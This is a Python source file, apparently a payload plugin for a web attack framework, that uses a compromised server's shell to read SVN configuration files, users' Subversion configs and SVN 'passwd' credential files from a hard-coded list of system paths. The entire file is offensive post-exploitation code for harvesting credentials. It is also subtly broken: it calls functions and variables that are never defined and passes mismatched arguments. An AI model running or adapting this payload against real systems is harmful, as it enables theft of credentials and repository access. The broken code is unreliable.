import re
import core.data.kb.knowledgeBase as kb
from plugins.attack.payloads.base_payload import base_payload

class svn_config_files(base_payload):
    '''
    This payload shows SVN Server configuration files
    '''
    def api_read(self):
        result = {}
        result['parent_path'] = []
        result['path'] = []
        result['auth'] = []
        files = []

        def parse_parent_path(config):
            parent_path = re.findall('(?<=SVNParentPath )(.*)', config, re.MULTILINE)
            if parent_path:
                return parent_path
            else:
                return ''
        
        def parse_path(config):
            path = re.findall('(?<=SVNPath )(.*)', config, re.MULTILINE)
            if path:
                return path
            else:
                return ''
        
        def parse_auth_files(config):
            auth = re.findall('(?<=AuthUserFile )(.*)', config, re.MULTILINE)
            auth2 = re.findall('(?<=AccessFileName )(.*)', config, re.MULTILINE)
            if auth and auth2:
                return auth+auth2
            if auth:
                return auth
            if auth2:
                return auth2
            else:
                return ''
        
        def multi_parser(file, file_content):
            parent_path = parse_parent_path(file_content)
            if parent_path:
                result['parent_path'].append(file_content)
            path = parse_path(file_content)
            if path:
                result['path'].append(path)
            auth = parse_auth(file_content)
            if auth:
                result['auth'].append(auth)
            result.update({file:content})

        files.append('/etc/httpd/conf.d/subversion.conf')
        files.append('/etc/httpd/conf.d/viewvc.conf')
        files.append('/etc/viewvc/viewvc.conf')
        files.append('/opt/viewvc/viewvc.conf')
        files.append('/etc/httpd/conf.d/statsvn.conf')
        files.append('/srv/trac/projectX/conf/trac.ini')
        files.append('/etc/apache2/conf.d/subversion.conf')
        files.append('/etc/subversion/conf/svnserve.conf')
        files.append('/usr/local/subversion/conf/httpd.conf')
        files.append('/etc/sasl/subversion.conf')
        files.append('/var/local/svn/conf/svnserve.conf')
        files.append('/srv/svn/repositories/svntest/conf/svnserve.conf')
        files.append('/var/svn/conf/commit-access-control.cfg')

        home_directory = self.exec_payload('users_name').values()
        for directory in home_directory:
            files.append(directory+'.subversion/config')

        apache_config_directory = self.exec_payload('apache_config_directory')['apache_directory']
        if apache_config_directory:
            dav_conf_file_content = self.shell.read(apache_config_directory+'mods-enabled/dav_svn.conf')
            if dav_conf_file:
                multi_parser(apache_config_directory+'mods-enabled/dav_svn.conf', dav_conf_file_content)

        apache_config_files= self.exec_payload('apache_config_files')['apache_config']
        for file, file_content in apache_config_files.iteritems():
            if file_content:
                multi_parser(file, file_content)
    
        user_folders = self.exec_payload('users_name')
        for user, folder in user_folders.iteritems():
            if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                for dirname in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                    file_content = self.shell.read(folder+dirname.lower()+'/conf/svnserve.conf')
                    passwd_content = self.shell.read(folder+dirname.lower()+'/conf/passwd')
                    if file_content:
                        multi_parser(file_content)
                    if passwd_content:
                        multi_parser(passwd_content)
                    multi_parser(file, file_content)
        
        if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
            for folder in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                file_content = self.shell.read('/srv/svn/'+folder.lower()+'/conf/svnserve.conf')
                passwd_content = self.shell.read('/srv/svn/'+folder.lower()+'/conf/passwd')
                if file_content:
                    multi_parser(file_content)
                if passwd_content:
                    multi_parser(passwd_content)
        for file in files:
            multi_parser(file)
        
        return result

    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('SVN Config Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        if result == [ ]:
            result.append('SVN configuration files not found.')
        return result
        
